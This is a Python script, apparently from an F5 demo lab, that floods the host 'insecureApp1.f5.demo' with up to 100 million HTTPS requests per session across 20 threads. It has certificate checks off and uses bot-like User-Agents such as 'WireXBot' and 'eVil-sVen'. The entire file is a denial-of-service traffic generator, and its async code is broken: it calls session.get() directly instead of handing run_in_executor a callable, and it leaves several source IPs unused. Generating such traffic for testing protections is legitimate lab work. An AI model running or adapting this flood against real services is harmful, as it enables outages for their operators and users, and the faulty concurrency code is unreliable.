import asyncio 
from concurrent.futures import ThreadPoolExecutor
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
from requests_toolbelt.adapters.source import SourceAddressAdapter

numOfWorkers = 20 
numOfRequests = 100000000 
fqdn = 'insecureApp1.f5.demo'
httpHost = 'https://' + fqdn
 
srcIp1 = '10.1.10.51'
srcIp2 = '10.1.10.52'
srcIp3 = '10.1.10.53'

srcIp4 = '10.1.10.100'

executor = ThreadPoolExecutor(max_workers=numOfWorkers)
loop = asyncio.get_event_loop()

similarityHeaders1 = {}
similarityHeaders1['Host'] = fqdn 
similarityHeaders1['Pragma'] = 'no-cache' 
similarityHeaders1['Cache-Control'] = 'no-cache' 
similarityHeaders1['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
similarityHeaders1['Upgrade-Insecure-Requests'] = '1' 
similarityHeaders1['User-Agent'] = 'eVil-sVen' 
similarityHeaders1['Referer'] = 'https://10.0.2.1/none.htm' 
similarityHeaders1['Accept-Encoding'] = 'gzip, deflate' 
similarityHeaders1['Accept-Language'] = 'en-US' 


similarityHeaders2 = {}
similarityHeaders2['Host'] = fqdn 
similarityHeaders2['Pragma'] = 'no-cache' 
similarityHeaders2['Cache-Control'] = 'no-cache' 
similarityHeaders2['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
similarityHeaders2['Upgrade-Insecure-Requests'] = '1' 
similarityHeaders2['User-Agent'] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)' 
similarityHeaders2['Referer'] = 'https://10.0.2.1/none.htm' 
similarityHeaders2['Accept-Encoding'] = 'gzip, deflate' 
similarityHeaders2['Accept-Language'] = 'en-US' 


similarityHeaders3 = {}
similarityHeaders3['Host'] = fqdn 
similarityHeaders3['Pragma'] = 'no-cache' 
similarityHeaders3['Cache-Control'] = 'no-cache' 
similarityHeaders3['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
similarityHeaders3['Upgrade-Insecure-Requests'] = '1' 
similarityHeaders3['User-Agent'] = 'WireXBot' 
similarityHeaders3['Referer'] = 'https://10.0.2.1/none.htm' 
similarityHeaders3['Accept-Encoding'] = 'gzip, deflate' 
similarityHeaders3['Accept-Language'] = 'en-US' 



session1 = requests.Session()
session2 = requests.Session()
session3 = requests.Session()

session1.mount('https://', SourceAddressAdapter((srcIp4)))
session2.mount('https://', SourceAddressAdapter((srcIp4)))
session3.mount('https://', SourceAddressAdapter((srcIp4)))

 
async def make_requests():
    futures = [loop.run_in_executor(executor, session1.get(url=httpHost,headers=similarityHeaders1,verify=False), httpHost) for _ in range(numOfRequests)]

    futures = [loop.run_in_executor(executor, session2.get(url=httpHost,headers=similarityHeaders2,verify=False), httpHost) for _ in range(numOfRequests)]
    futures = [loop.run_in_executor(executor, session3.get(url=httpHost,headers=similarityHeaders3,verify=False), httpHost) for _ in range(numOfRequests)]
    #await asyncio.wait(futures)
 
start = time.time()
loop.run_until_complete(make_requests())
print(time.time() - start)

